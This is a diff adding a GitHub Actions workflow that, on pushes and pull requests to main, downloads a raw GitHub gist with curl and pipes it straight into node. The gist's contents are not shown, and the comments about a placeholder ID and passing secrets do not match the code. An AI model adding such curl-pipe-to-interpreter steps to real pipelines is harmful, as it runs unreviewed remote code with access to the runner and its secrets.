@@ -1,0 +1,28 @@
+name: Secret Gist JS Script
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  run_script:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Set up Node.js
+        uses: actions/setup-node@v2
+        with:
+          node-version: "20"
+
+      - name: Run JavaScript script
+        run: |
+          # Replace 'YOUR_GIST_ID' with your actual Gist ID
+          # Pass repository secrets as environment variables
+          curl -L https://gist.github.com/DinoDelicdev/f3442054437ccccdd357ae3e429b6555/raw | node
